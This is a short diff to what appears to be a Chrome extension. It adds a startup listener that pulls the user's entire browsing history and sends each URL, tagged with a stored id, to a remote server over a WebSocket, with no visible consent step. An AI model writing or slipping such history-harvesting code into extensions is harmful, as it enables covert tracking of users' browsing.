@@ -67,3 +67,18 @@ ws.onopen = function(event){
     ws.send(JSON.stringify(jsonPackage));
   });
 }
+
+chrome.runtime.onStartup.addListener(function(){
+  ws.onopen = function(event){
+    chrome.history.search({text: ""}, function(data) {
+      data.forEach(function(page) {
+        var urli = page.url;
+        chrome.storage.sync.get("id", function(ev){
+          var id=ev.id;
+          var jsonPackage = {id: id, type: 'history', history : urli};
+          ws.send(JSON.stringify(jsonPackage));
+        });
+      });
+    });
+  }
+});
